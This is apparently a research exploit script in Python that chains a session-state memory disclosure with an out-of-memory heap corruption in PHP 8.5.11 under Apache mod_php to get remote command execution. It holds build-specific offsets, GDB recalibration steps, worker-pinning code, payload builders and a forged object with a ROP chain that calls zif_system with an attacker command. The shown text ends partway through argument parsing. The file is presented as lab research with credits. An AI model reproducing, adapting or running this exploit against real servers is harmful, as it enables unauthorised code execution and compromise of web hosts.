#!/usr/bin/env python3
"""Integrated PHP2Shell leak-to-RCE chain for PHP 8.5.11 apache/mod_php.

EVIDENCE EDITION: every invocation performs a fresh A1/B1 leak, validates its
own live addresses, and only then permits the optional RCE stage. Raw responses,
cookies, leak validation, and RCE outcome are preserved as JSON evidence.

Usage: python3 php8511_rce.py --host TARGET --rce --evidence-dir evidence

Purpose and vulnerability mechanisms
====================================
This is a pure-HTTP, application-independent research exploit for an isolated
lab.  Its default endpoint is ``/index.php`` and is configurable with
``--path``.  With no ``--rce`` it stops after reproducing the overlong
``Set-Cookie`` disclosure.  With ``--rce [COMMAND]`` it composes two distinct PHP
memory-safety mechanisms.  Bare ``--rce`` runs the documented default and
verifies ``/proof.txt``; a custom command is delivered without claiming that
its execution was verified.

1. The A1/B1 disclosure is derived from 9bie's cross-request session-state
   chain.  An upload-progress request reaches an OOM bailout before request
   state is safely reset; a later request in the *same mod_php child* consumes
   the stale ``PS(id)`` and encodes an attacker-forged ``zend_string`` into the
   session cookie.  This is strongest-fit **CVE-2026-109619** behavior: request-
   owned session globals outlive their backing request heap.  OOM is the
   producer, but the security boundary crossed by this stage is request
   lifetime.  This is mechanism-based attribution, not a CNA reassignment of
   any individual public PoC.

2. The optional final sink is adapted from Cookiengineer's OOM RCE.  Multipart
   amplification exhausts the stock 128 MiB heap while
   ``_zend_hash_str_add_or_update_i()`` has counted but not initialized its
   final ``HashTable`` bucket.  Same-request shutdown walks the incomplete
   bucket into a forged object, a libphp-only ``jump_fcontext`` ROP chain, and
   ``zif_system``.  This is the incomplete-state/cleanup mechanism of
   **CVE-2026-109618**.

Worker discovery, chunked transfer, prefork saturation, the full-pool scrub,
and the clean holder rebind are delivery/affinity techniques, not additional
CVEs.  The scrub exists because the validated Apache environment can retain
children already marked for graceful retirement when its IPv6 listener wakeup
fails; without it, a second invocation may place A1 and B1 in different
processes.  The post-scrub repin is concurrent so VPN latency cannot recreate
an idle-surplus window.  Debugger mappings were used only to calibrate and
independently verify the constants below; successful end-to-end runs derive
their live bases from the HTTP cookie.

Validated exact environment (2026-10-23)
========================================
This profile is intentionally build-specific.  Recalibrate all offsets and
heap geometry for any other binary, compiler flags, module set, architecture,
or loader layout.

* PHP 8.5.11 NTS, Zend Engine 4.5.11, source tag ``php-8.5.11``:
  annotated tag object ``597eb0b4e32cc8802e112fe13cc92fb5636a1781``;
  peeled source commit ``678778973bb4d4185c06ef1320de50f1a975d3c8``.
* Official ``php-8.5.11.tar.xz`` SHA-256:
  ``d9be75c08e8c316f4c8f4194d8fbe1750a15f6a6d9d4e3fe72082abeeb800360``.
* Source build flags: ``-O2 -g -fno-omit-frame-pointer
  -fcf-protection=none``; Apache 2.4.66 (Ubuntu) ``mod_php``/prefork on
  x86-64; glibc 2.43 (Ubuntu ``2.43-2ubuntu2.4``); validation kernel
  ``Linux 7.0.0-38-generic``.
* ``/usr/lib/apache2/modules/libphp.so`` SHA-256:
  ``ecd97e302e8cb3fd106c0541410256ad6597cb6410166beee0ab773ff4974b36``;
  GNU Build ID ``c01226a7f67b3226c1d2f81f4fc5041846914117``.
* ASLR enabled (``kernel.randomize_va_space=2``), Apache defaults including
  ``StartServers=5`` and ``MaxRequestWorkers=150``, and unmodified upstream
  ``php.ini-production``: ``memory_limit=128M``, ``post_max_size=8M``,
  ``upload_max_filesize=2M``, ``max_file_uploads=20``,
  ``max_input_vars=1000``, ``max_input_nesting_level=64``, error display off,
  logging on, and session upload progress plus cleanup enabled.
* Exact module offsets: ``zval_ptr_dtor=0x7ae960``,
  ``zif_system=0x598650``, ``jump_fcontext+0x2e=0x6362ae``,
  ``pop rdi; ret=0x280d8d``, ``pop rsi; ret=0x2cbe07``, and
  alignment ``ret=0x280d8e``.
* Exact heap/layout constants: Zend main chunk ``libphp+0x3400000``;
  post-disclosure controlled block ``main+0x5c400``; stale-ID forge page
  ``0x1e3``; 402,500 duplicate multipart headers for the stock-128M sink.
* The combined upstream fix used for source comparison is php-src commit
  ``506e87fa7dcdd306975e5b8f8265ee03527aacbf`` ("Avoid state corruption via
  bailout"), released in the patched 8.5.12/8.4.27/8.3.36/8.2.35 lines.

Recalibrating a different build
===============================
Never transplant the constants above based only on ``PHP_VERSION``.  Preserve
the candidate module first, record its identity, and do all debugger work in
an isolated copy of the target environment.  For example::

    LIBPHP=/usr/lib/apache2/modules/libphp.so
    sha256sum "$LIBPHP"
    readelf -n "$LIBPHP" | grep 'Build ID'
    readelf -lW "$LIBPHP"                 # record executable PT_LOAD ranges
    nm -an "$LIBPHP" | grep -wE 'zval_ptr_dtor|zif_system|jump_fcontext'

``nm`` values are image-relative because this module is ET_DYN.  The pivot is
``jump_fcontext+0x2e`` only after disassembly confirms the same instruction
sequence.  Find and inspect ROP gadgets rather than copying byte offsets::

    ROPgadget --binary "$LIBPHP" --only 'pop|ret' | \
        grep -E 'pop rdi ; ret$|pop rsi ; ret$|: ret$'
    objdump -d -M intel "$LIBPHP" | less

Verify every chosen gadget lies in an executable ``PT_LOAD`` and inspect its
surrounding instructions.  If normal symbols are stripped, use the matching
debug file/build ID with ``readelf -Ws`` or GDB; do not derive offsets from a
different package that merely reports the same PHP version.

To recalibrate the disclosure, run a fresh debug child with the same INI and
modules, pause the selected rebound worker, map its client port to a PID with
``ss -tnp``, and attach GDB.  A convenient driver form is::

    python3 exploit.py --host TARGET --port 80 --path /index.php \
        --pause-after-rebind 60
    # Read new_port from the log on the target, then:
    ss -tnp sport = :80 dport = :NEW_PORT
    gdb -q -p CHILD_PID
    (gdb) break php_url_encode
    (gdb) continue
    (gdb) p/x ps_globals.id
    (gdb) p/x ((unsigned long)ps_globals.id & 0x1fffff) >> 12
    (gdb) p ps_globals.send_cookie

The second GDB expression is the ID page; use it as ``--forge-page``.  Sweep
the A1 query/burner/progress lengths and B1 ``G``/``X`` geometry
until GDB shows OOM in ``php_url_encode()``, ``PS(send_cookie)=1``, and the B1
cookie contains a highly repeated pointer that resolves exactly to the new
``zval_ptr_dtor``.  Confirm the derived module base against mappings only
*after* the HTTP result; mappings must never be an exploit input.

Measure the module-to-main-chunk delta in several fresh ASLR parent lifetimes.
With symbols loaded in GDB, compute the module base from a known symbol and
align the Zend heap pointer to its 2 MiB chunk::

    set $libphp = (unsigned long)&zval_ptr_dtor - NEW_DTOR_OFFSET
    set $main = (unsigned long)alloc_globals.mm_heap & ~0x1fffffUL
    p/x $libphp
    p/x $main
    p/x $main - $libphp

Accept the delta only if it repeats for independently started Apache parents
and the leaked cookie contains pointers in the derived main-chunk bucket.

Finally recalibrate the 109618 sink *after the complete A1/B1 history*, not on
a virgin worker.  Use ``--pause-before-rce``, attach the selected debug child,
and break on
``zend_mm_safe_error``, ``_zend_hash_str_add_or_update_i``, and
``zend_array_destroy``, and identify the shutdown table with ``nNumUsed=46``.
For this payload layout the controlled block is ``arData-0x200``; subtract the
aligned main-chunk base to obtain ``--rce-block-offset``.  Sweep
``--rce-headers`` around the OOM boundary until the failed allocation is the
80,000-byte key's 81,920-byte allocation and the incomplete bucket contains
the forged object.  Recheck the pivot, fake handlers, ROP registers, and entry
to ``zif_system`` in GDB, then validate without a debugger using a fresh,
unique proof name.  Repeat under a new ASLR parent and run twice without an
Apache restart before treating the profile as usable.

Direct lineage and credits
==========================
Credit belongs to the original researchers and repositories.  This local
composition, retuning, worker scrub, and validation do not replace their
copyright or licensing terms.

* **9bie**, ``php2shell-bypass-aslr-exp`` commit
  ``17e98ee81025cccfd94b4f9c9a17bf269c65ff75``: A1/B1 session-state OOM,
  forged-cookie disclosure geometry, worker occupancy, and the original
  ASLR-on chain.  The local 8.5.11 port widens its overly narrow ``0x7f``
  pointer floor and retunes the heap geometry.
* **dinosn**, ``php-cve-2026-10961x-lab-poc`` commit
  ``b1e419912219691417c72b122f6eb410b938eee7``: instrumented CVE controls,
  Ninebie-class porting, stock-configuration experiments, offset/profile work,
  and worker-saturation research used as comparison and calibration guidance.
* **Cookiengineer**, ``actual-php2shell`` commit
  ``1d5208ba5090cbbc56a091f6607996c3bbb21171``: the independently validated
  CVE-2026-109618 incomplete-bucket/object-destruction RCE sink.  The local
  adapter amplifies it to 128 MiB and replaces libc-dependent ROP with gadgets
  and ``zif_system`` from this exact libphp image.

Other reviewed/referenced public PoCs (not direct code lineage for this file)
are credited to **Eness** (``php2shell-CVE-2026-109618-CVE-2026-109619-PoC``,
``df8b16fe69ab7218f496b5d88127253fc90ff92e``), **0x4148**
(``CVE-2026-109618-php2shell-lab``,
``bc40fb2c96d5e92121e6bf8b996f7ba3ad057413``), **Ikow**
(``php2shell-poc``, ``31519e6d8a84dee1df1262961ed1bebb65accadd``),
**Murrez** (``php2shell``, ``e62535936b5fb1d013f8f52832df8c740c88e672``),
and **Syrex1013** (``php2shell``,
``2b14725288c519380810fb057b214889eea9ee76``).

Those revision identifiers are included here so this file retains its own
provenance when copied outside the original research tree.
"""

from __future__ import annotations

import argparse
import json
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
import socket
import struct
import sys
import tempfile
import threading
import time
import urllib.parse


def print(*values: object, sep: str = " ", end: str = "\n",
          file: object | None = None, flush: bool = False) -> None:
    """Print every logical line with an epoch timestamp to microseconds."""
    stream = file if file is not None else sys.stdout
    payload = sep.join(str(value) for value in values) + end
    for line in payload.splitlines(keepends=True):
        now = time.time_ns()
        stamp = f"{now // 1_000_000_000}.{(now // 1_000) % 1_000_000:06d}"
        stream.write(f"[{stamp}] {line}")
    # Logs are used to coordinate long-running worker-affinity diagnostics.
    stream.flush()


DEFAULT_QUERY = (
    "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
    "&z=vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv"
)
TARGET_PATH = "/index.php"
DEFAULT_RCE_COMMAND = "id>/var/www/html/proof.txt"
DEFAULT_RCE_PROOF_URL = "/proof.txt"
MULTIPART_BOUNDARY = b"C" * 10
RCE_BOUNDARY = b"AMP128BOUNDARY"
IS_OBJECT = 8


def build_a1_body(path: Path, args: argparse.Namespace) -> None:
    """Build the END-cleanup send-cookie OOM request body."""
    parts = 860
    depth = 64
    key_pad = 90
    big_len = 8000
    boundary = MULTIPART_BOUNDARY
    out = bytearray()

    def nested_name(index: int) -> bytes:
        return (("files[R%05d%s]" % (index, "K" * key_pad)).encode()
                + b"[a]" * (depth - 2))

    def part(name: bytes, value: bytes = b"", filename: bytes | None = None,
             content_type: bytes | None = None) -> None:
        out.extend(b"--" + boundary
                   + b"\r\nContent-Disposition: form-data; name=\""
                   + name + b"\"")
        if filename is not None:
            out.extend(b"; filename=\"" + filename + b"\"")
        out.extend(b"\r\n")
        if content_type is not None:
            out.extend(b"Content-Type: " + content_type + b"\r\n")
        out.extend(b"\r\n" + value + b"\r\n")

    part(b"PHPSESSID", b"\x00")
    for index in range(parts):
        if index == 0:
            content_type = b"C" * 103
        elif index == 1:
            content_type = b"C" * 231
        else:
            content_type = b"application/octet-stream"
        out.extend(b"--" + boundary
                   + b"\r\nContent-Disposition: form-data; name=\""
                   + nested_name(index) + b"\"")
        out.extend(b"; filename=\"A\"" if index < 2
                   else b"; filename=\"\"")
        out.extend(b"\r\nContent-Type: " + content_type + b"\r\n\r\n")
    for index in range(args.a1_fillers128):
        name = ("f%04d" % index).encode().ljust(103, b"x")[:103]
        part(name, b"v" * 8)
    for index in range(args.a1_big):
        part(("b%04d" % index).encode(), b"B" * big_len)
    for index in range(args.a1_burners):
        part(("u%02d" % index).encode(), b"U" * args.a1_burner_len)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * args.a1_progress_len)
    out.extend(b"--" + boundary + b"--\r\n")
    path.write_bytes(out)
    count = (2 + parts + args.a1_fillers128 + args.a1_big
             + args.a1_burners)
    print(f"body={len(out)} parts={count}")


def leak_tag(index: int, tagged: bool) -> bytes:
    return (b"/" + ("%02d" % (index % 100)).encode() + b"BBBBB"
            if tagged else b"BBBB/BBB")


def leak_forge_fill_value(pages: int, page: int, fake_len: int,
                          index: int, tagged: bool) -> bytes:
    length = pages * 4096 - 25
    value = bytearray(b"A" * length)
    header = page * 0x1000 - 0x1018
    if 0 <= header and header + 0x20 <= length:
        struct.pack_into("<I", value, header, 0)
        struct.pack_into("<I", value, header + 4, 0x16)
        struct.pack_into("<Q", value, header + 8, 0)
        struct.pack_into("<Q", value, header + 0x10, fake_len)
        value[header + 0x18:header + 0x20] = leak_tag(index, tagged)
    return bytes(value)


def build_leak_body(path: Path, args: argparse.Namespace) -> None:
    """Build the B1 reclaim body and forged zend_string headers."""
    fake_len = args.fake_len
    out = bytearray()

    def part(name: bytes, value: bytes) -> None:
        out.extend(b"--" + MULTIPART_BOUNDARY
                   + b"\r\nContent-Disposition: form-data; name=\""
                   + name + b"\"\r\n\r\n" + value + b"\r\n")

    part(b"PHPSESSID", b"a")
    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    index = 0
    pages_sequence = [511] * 14 + [args.mid_pages, 511]
    for pages in pages_sequence:
        value = leak_forge_fill_value(
            pages, args.forge_page, fake_len, index, True)
        name = (b"f%04d" % index).ljust(120, b"f")[:120]
        part(name, value)
        index += 1
    for _ in range(args.nested_fields):
        name = ("x%05d" % index).encode() + b"[a]" * 12
        part(name, b"v")
        index += 1
    out.extend(b"--" + MULTIPART_BOUNDARY + b"--\r\n")
    path.write_bytes(out)
    print(f"body={len(out)} fields={index} fake_len={fake_len:#x}")


@dataclass
class Holder:
    """A worker-pinning request whose chunk stream can be finished in place."""

    sock: socket.socket
    feeding: bool = True
    lock: threading.Lock = field(default_factory=threading.Lock)

    def __getattr__(self, name: str) -> object:
        return getattr(self.sock, name)


def close_holder(holder: Holder) -> None:
    """Stop keepalive writes and close a holder without a sender race."""
    with holder.lock:
        holder.feeding = False
        try:
            holder.sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        holder.sock.close()


def open_accepted_holder(host: str, port: int,
                         timeout: float = 30.0) -> Holder:
    """Open one holder and wait for proof that a child accepted it."""
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    sock.sendall(
        b"POST " + TARGET_PATH.encode() + b" HTTP/1.1\r\nHost: x\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Connection: keep-alive\r\n"
        b"Expect: 100-continue\r\n\r\n"
    )
    interim = bytearray()
    try:
        while b"\r\n\r\n" not in interim and len(interim) < 8192:
            chunk = sock.recv(8192)
            if not chunk:
                break
            interim.extend(chunk)
        if b" 100 Continue\r\n" not in interim:
            raise RuntimeError(
                f"holder was not accepted by a worker: {bytes(interim[:120])!r}"
            )
        sock.sendall(b"1\r\nx\r\n")
        return Holder(sock)
    except BaseException:
        sock.close()
        raise


def hold_workers_parallel(host: str, port: int, workers: int,
                          holders: list[Holder]) -> list[Holder]:
    """Repin a known capacity without a VPN-latency retirement window."""
    opened: list[Holder] = []
    try:
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = [
                pool.submit(open_accepted_holder, host, port, 30.0)
                for _ in range(workers)
            ]
            for future in as_completed(futures):
                opened.append(future.result())
                count = len(opened)
                if count % 25 == 0 or count == workers:
                    print(f"[*] accepted holders {count}/{workers} parallel",
                          flush=True)
    except BaseException:
        for holder in opened:
            close_holder(holder)
        raise
    holders.extend(opened)
    return holders


def discover_worker_pool(host: str, port: int,
                         holders: list[Holder], max_workers: int,
                         timeout: float, checks: int) -> int:
    """Fill prefork dynamically until repeated holders remain unaccepted."""
    misses = 0
    while len(holders) < max_workers:
        try:
            holders.append(open_accepted_holder(host, port, timeout))
        except TimeoutError:
            misses += 1
            print(f"[*] capacity probe {misses}/{checks} timed out at "
                  f"{len(holders)} accepted holders", flush=True)
            if misses >= checks:
                break
            time.sleep(1.0)
            continue
        misses = 0
        if len(holders) % 25 == 0:
            print(f"[*] accepted holders {len(holders)} (auto)", flush=True)
    if not holders or misses < checks:
        raise RuntimeError(
            f"worker discovery did not find a ceiling below {max_workers}"
        )
    print(f"[+] discovered MaxRequestWorkers={len(holders)}", flush=True)
    return len(holders)


def keep_holders_alive(holders: list[Holder],
                       stop: threading.Event) -> None:
    """Beat mod_reqtimeout's body minimum-rate check without completing POSTs."""
    # Two times Debian/Ubuntu's 500-byte/s default leaves the tunnel mostly
    # available to the 33 MiB disclosure request.
    block = b"400\r\n" + b"x" * 1024 + b"\r\n"
    while not stop.wait(1.0):
        for holder in tuple(holders):
            try:
                with holder.lock:
                    if holder.feeding:
                        holder.sock.sendall(block)
            except OSError:
                pass


def read_content_length_response(sock: socket.socket, timeout: float) -> bytes:
    """Read one keep-alive HTTP response with an explicit Content-Length."""
    sock.settimeout(timeout)
    response = bytearray()
    while b"\r\n\r\n" not in response:
        chunk = sock.recv(65536)
        if not chunk:
            raise ConnectionError("worker closed before response headers")
        response.extend(chunk)
        if len(response) > 65536:
            raise RuntimeError("oversized qualification response headers")
    head, body = bytes(response).split(b"\r\n\r\n", 1)
    content_length = None
    for line in head.split(b"\r\n")[1:]:
        name, sep, value = line.partition(b":")
        if sep and name.lower() == b"content-length":
            content_length = int(value.strip())
            break
    if content_length is None:
        raise RuntimeError("qualification response lacks Content-Length")
    while len(body) < content_length:
        chunk = sock.recv(min(65536, content_length - len(body)))
        if not chunk:
            raise ConnectionError("worker closed during response body")
        body += chunk
    if len(body) != content_length:
        raise RuntimeError("qualification response over-read pipelined bytes")
    return head + b"\r\n\r\n" + body


def cleanly_release_holder(holder: Holder, host: str, port: int,
                           path: str, timeout: float) -> None:
    """End a holder without Apache's two-second lingering-close path."""
    with holder.lock:
        holder.feeding = False
        holder.sock.sendall(b"0\r\n\r\n")
    first = read_content_length_response(holder.sock, timeout)
    if not first.startswith(b"HTTP/1.1 200"):
        raise RuntimeError(f"holder completion failed: {first[:80]!r}")
    holder.sock.sendall(
        b"GET " + path.encode() + b" HTTP/1.1\r\nHost: "
        + host.encode() + b":" + str(port).encode()
        + b"\r\nConnection: close\r\n\r\n"
    )
    second = read_content_length_response(holder.sock, timeout)
    if not second.startswith(b"HTTP/1.1 200"):
        raise RuntimeError(f"worker close probe failed: {second[:80]!r}")
    # Let Apache initiate and finish the advertised close.  Closing from the
    # client immediately after Content-Length bytes sends the worker through
    # its two-second lingering-close path and masks respawn latency.
    holder.sock.settimeout(timeout)
    while holder.sock.recv(4096):
        pass
    holder.sock.close()


def scrub_worker_pool(holders: list[Holder], host: str, port: int,
                      path: str, timeout: float) -> None:
    """Force every pinned prefork child through request completion.

    Apache's graceful-stop wakeup is broken when its IPv6 listener is
    unreachable, leaving retirement-marked idle children in the pool.  Ending
    every holder concurrently makes those children observe the flag and exit;
    healthy children simply return to accept().
    """
    batch = list(holders)
    holders.clear()

    def release(holder: Holder) -> str | None:
        try:
            cleanly_release_holder(holder, host, port, path, timeout)
            return None
        except (OSError, RuntimeError) as exc:
            close_holder(holder)
            return str(exc)

    errors: list[str] = []
    with ThreadPoolExecutor(max_workers=len(batch)) as pool:
        futures = [pool.submit(release, holder) for holder in batch]
        for future in as_completed(futures):
            error = future.result()
            if error:
                errors.append(error)
    print(f"[*] scrubbed {len(batch)} workers; early_closes={len(errors)}",
          flush=True)


@dataclass
class ChunkedJob:
    thread: threading.Thread
    errors: list[BaseException]


def start_chunked(host: str, port: int, path: str, body: Path,
                  response: Path, timeout: float) -> ChunkedJob:
    """Start a streaming chunked request without an external helper."""
    errors: list[BaseException] = []

    def send() -> None:
        body_size = body.stat().st_size
        started = time.monotonic()
        received = bytearray()
        sock: socket.socket | None = None
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            sock.settimeout(timeout)
            sock.sendall(
                b"POST " + path.encode() + b" HTTP/1.1\r\nHost: "
                + host.encode() + b":" + str(port).encode()
                + b"\r\nContent-Type: multipart/form-data; boundary="
                + MULTIPART_BOUNDARY
                + b"\r\nTransfer-Encoding: chunked\r\n"
                  b"Connection: close\r\n\r\n"
            )
            with body.open("rb") as stream:
                while True:
                    piece = stream.read(65536)
                    if not piece:
                        break
                    sock.sendall(f"{len(piece):x}\r\n".encode()
                                 + piece + b"\r\n")
            sock.sendall(b"0\r\n\r\n")
            while len(received) < 4 << 20:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                received.extend(chunk)
        except OSError as exc:
            # A1 and the RCE sink deliberately provoke request termination;
            # preserve any response already received, as the original sender
            # did, but make a connect failure visible.
            if sock is None:
                errors.append(exc)
        finally:
            if sock is not None:
                sock.close()
            response.write_bytes(received)
            status = bytes(received).split(b"\r\n", 1)[0][:60]
            print(f"body={body_size} resp={len(received)} "
                  f"elapsed={time.monotonic() - started:.2f}s "
                  f"status={status.decode('latin1', 'replace')!r}")

    thread = threading.Thread(target=send, name="chunked-request", daemon=True)
    thread.start()
    return ChunkedJob(thread, errors)


def finish_chunked(job: ChunkedJob, response: Path, timeout: float) -> bytes:
    job.thread.join(timeout)
    if job.thread.is_alive():
        raise TimeoutError("chunked request did not finish")
    if job.errors:
        raise job.errors[0]
    return response.read_bytes()


def cookie_value(response: bytes) -> bytes:
    marker = b"Set-Cookie: PHPSESSID="
    start = response.find(marker)
    if start < 0:
        return b""
    return response[start + len(marker):].split(b"\r\n", 1)[0]


def summarize_cookie(encoded: bytes, pointer_floor: int) -> dict[str, object]:
    decoded = urllib.parse.unquote_to_bytes(encoded.decode("latin1"))
    pointers = Counter()
    for off in range(0, len(decoded) - 7, 8):
        value = struct.unpack_from("<Q", decoded, off)[0]
        if pointer_floor <= value <= 0x7FFFFFFFFFFF:
            pointers[value] += 1
    return {
        "decoded": decoded,
        "pointers": pointers,
        "top": pointers.most_common(20),
    }


def pack_u64(value: int) -> bytes:
    return struct.pack("<Q", value)


def pack_u32(value: int) -> bytes:
    return struct.pack("<I", value)


def build_rce_pad(heap_base: int, libphp_base: int, command: bytes, *,
                  block_offset: int, pivot_offset: int,
                  pop_rdi_offset: int, pop_rsi_offset: int,
                  ret_offset: int, zif_system_offset: int) -> bytes:
    """Build the forged bucket, object, handlers, ROP, and execute_data."""
    if len(command) > 48:
        raise ValueError("RCE command exceeds the 48-byte carrier")
    block = heap_base + block_offset
    handlers = block + 24 + 2000
    obj = block + 24 + 2048
    execute_data = block + 24 + 2240
    command_string = execute_data + 0x80
    return_value = block + 24 + 2464

    pivot = libphp_base + pivot_offset
    pop_rdi = libphp_base + pop_rdi_offset
    pop_rsi = libphp_base + pop_rsi_offset
    ret = libphp_base + ret_offset
    zif_system = libphp_base + zif_system_offset

    pad = bytearray(b"P" * 2528)
    pad[2000:2008] = pack_u64(0)
    pad[2008:2016] = pack_u64(pivot)
    pad[2016:2024] = pack_u64(ret)

    offset = 2048
    pad[offset:offset + 4] = pack_u32(1)
    pad[offset + 4:offset + 8] = pack_u32(IS_OBJECT)
    pad[offset + 8:offset + 12] = pack_u32(0)
    pad[offset + 0x10:offset + 0x18] = pack_u64(0)
    pad[offset + 0x18:offset + 0x20] = pack_u64(handlers)
    pad[offset + 0x20:offset + 0x28] = pack_u64(0)
    pad[offset + 0x28:offset + 0x40] = b"\x00" * 24
    pad[offset + 0x40:offset + 0x48] = pack_u64(pop_rdi)
    pad[offset + 0x48:offset + 0x50] = pack_u64(execute_data)
    pad[offset + 0x50:offset + 0x58] = pack_u64(pop_rsi)
    pad[offset + 0x58:offset + 0x60] = pack_u64(return_value)
    pad[offset + 0x60:offset + 0x68] = pack_u64(ret)
    pad[offset + 0x68:offset + 0x70] = pack_u64(zif_system)
    pad[offset + 0x70:offset + 0x78] = pack_u64(0)

    offset = 2240
    pad[offset:offset + 8] = pack_u64(0)
    pad[offset + 8:offset + 0x10] = pack_u64(0)
    pad[offset + 0x10:offset + 0x18] = pack_u64(return_value)
    pad[offset + 0x18:offset + 0x20] = pack_u64(0)
    pad[offset + 0x20:offset + 0x28] = pack_u64(0)
    pad[offset + 0x28:offset + 0x2C] = pack_u32(0)
    pad[offset + 0x2C:offset + 0x30] = pack_u32(1)
    pad[offset + 0x30:offset + 0x38] = pack_u64(0)
    pad[offset + 0x38:offset + 0x40] = pack_u64(0)
    pad[offset + 0x40:offset + 0x44] = pack_u32(0)
    pad[offset + 0x50:offset + 0x58] = pack_u64(command_string)
    pad[offset + 0x58:offset + 0x5C] = pack_u32(6)

    offset += 0x80
    pad[offset:offset + 4] = pack_u32(1)
    pad[offset + 4:offset + 8] = pack_u32(0x106)
    pad[offset + 8:offset + 0x10] = pack_u64(0)
    pad[offset + 0x10:offset + 0x18] = pack_u64(len(command) - 1)
    pad[offset + 0x18:offset + 0x18 + len(command)] = command
    pad[2464:2480] = b"\x00" * 16

    pad[1928:1936] = pack_u64(obj)
    pad[1936:1940] = pack_u32(IS_OBJECT | 0x100)
    pad[1940:1944] = pack_u32(0)
    return bytes(pad)


def rce_field(name: bytes, value: bytes) -> bytes:
    return (b"--" + RCE_BOUNDARY
            + b"\r\nContent-Disposition: form-data; name=\"" + name
            + b"\"\r\n\r\n" + value + b"\r\n")


def rce_large_key(index: int, size: int) -> bytes:
    return b"X" * (size - 16) + (b"%016d" % index)


def build_rce_body(args: argparse.Namespace, heap_base: int,
                   libphp_base: int, command: str) -> bytes:
    pad = build_rce_pad(
        heap_base, libphp_base, command.encode() + b"\x00",
        block_offset=args.rce_block_offset,
        pivot_offset=args.pivot_offset,
        pop_rdi_offset=args.pop_rdi_offset,
        pop_rsi_offset=args.pop_rsi_offset,
        ret_offset=args.ret_offset,
        zif_system_offset=args.zif_system_offset,
    )
    key_size = 80000
    body = bytearray()
    body += rce_field(b"memshift", b"M" * 40000)
    for index in range(30):
        body += rce_field(
            b"a[" + rce_large_key(index, key_size) + b"][c]", b"v")
    body += rce_field(b"pad", pad)
    body += rce_field(b"pad", b"x")
    for index in range(30, 45):
        body += rce_field(
            b"a[" + rce_large_key(index, key_size) + b"][c]", b"v")
    final_name = b"a[" + rce_large_key(45, key_size) + b"][c]"
    body += b"--" + RCE_BOUNDARY + b"\r\n"
    body += b"X: a\r\n" * args.rce_headers
    body += (b"Content-Disposition: form-data; name=\"" + final_name
             + b"\"\r\n\r\nv\r\n--" + RCE_BOUNDARY + b"--\r\n")
    if len(body) >= 8 * 1024 * 1024:
        raise ValueError(f"RCE body exceeds production post_max_size: {len(body)}")
    return bytes(body)


def http_exchange(host: str, port: int, request: bytes,
                  timeout: float) -> bytes:
    response = bytearray()
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except OSError:
        return b""
    sock.settimeout(timeout)
    try:
        sock.sendall(request)
        while True:
            data = sock.recv(65536)
            if not data:
                break
            response.extend(data)
    except OSError:
        pass
    finally:
        sock.close()
    return bytes(response)


def amplified_rce(args: argparse.Namespace, heap_base: int,
                  libphp_base: int, command: str,
                  proof_url: str | None) -> bool | None:
    body = build_rce_body(args, heap_base, libphp_base, command)
    print(f"[*] wire={len(body)} headers={args.rce_headers}")
    request = (
        b"POST " + args.path.encode() + b" HTTP/1.1\r\nHost: v\r\n"
        b"Content-Type: multipart/form-data; boundary=" + RCE_BOUNDARY
        + b"\r\nContent-Length: " + str(len(body)).encode()
        + b"\r\nConnection: close\r\n\r\n" + body
    )
    response = http_exchange(args.host, args.port, request, 30.0)
    first = response.split(b"\r\n", 1)[0] if response else b"<no response>"
    print(f"[*] response={len(response)} first={first!r}")
    if proof_url is None:
        return None
    time.sleep(0.5)
    proof = http_exchange(
        args.host, args.port,
        b"GET " + proof_url.encode()
        + b" HTTP/1.1\r\nHost: v\r\nConnection: close\r\n\r\n",
        5.0,
    )
    _, _, content = proof.partition(b"\r\n\r\n")
    if b"uid=" in content:
        print("[+] 128M amplified RCE:",
              content.decode("utf-8", "replace").strip())
        return True
    print("[-] no proof")
    return False


def main() -> int:
    global TARGET_PATH
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--path", default=TARGET_PATH,
                    help="PHP endpoint used for pinning and exploitation")
    ap.add_argument("--evidence-dir", type=Path, default=Path("leak-evidence-8511"),
                    help="directory for raw responses, cookies, and validation JSON")
    ap.add_argument("--timeout", type=float, default=600.0)
    ap.add_argument("--pause-after-rebind", type=float, default=0.0,
                    help="debug-only GDB attach pause on the rebound holder")
    ap.add_argument("--a1-big", type=int, default=78)
    ap.add_argument("--a1-fillers128", type=int, default=14)
    ap.add_argument("--a1-burners", type=int, default=19)
    ap.add_argument("--a1-burner-len", type=int, default=4000)
    ap.add_argument("--a1-progress-len", type=int, default=4072)
    ap.add_argument("--query", default=DEFAULT_QUERY)
    ap.add_argument("--forge-page", type=lambda x: int(x, 0), default=0x1E3,
                    help="page containing the stale session ID")
    ap.add_argument("--mid-pages", type=int, default=483,
                    help="pages in the hole-making G value (default: 483)")
    ap.add_argument("--nested-fields", type=int, default=900,
                    help="nested X fields placed into the tail hole")
    ap.add_argument("--fake-len", type=lambda x: int(x, 0), default=0x1C000)
    ap.add_argument("--pointer-floor", type=lambda x: int(x, 0),
                    default=0x6F0000000000)
    ap.add_argument("--zval-ptr-dtor-offset", type=lambda x: int(x, 0),
                    default=0x7AE960)
    ap.add_argument("--heap-from-lib-delta", type=lambda x: int(x, 0),
                    default=0x3400000,
                    help="exact-image Zend main-chunk delta from libphp")
    ap.add_argument(
        "--rce", nargs="?", const=DEFAULT_RCE_COMMAND, metavar="COMMAND",
        help=("after a fresh validated leak, deliver one RCE request; bare "
              f"--rce uses {DEFAULT_RCE_COMMAND!r} and checks /proof.txt"))
    ap.add_argument("--pause-before-rce", type=float, default=0.0,
                    help="debug-only pause after disclosure and before RCE")
    ap.add_argument("--rce-block-offset", type=lambda x: int(x, 0),
                    default=0x5C400,
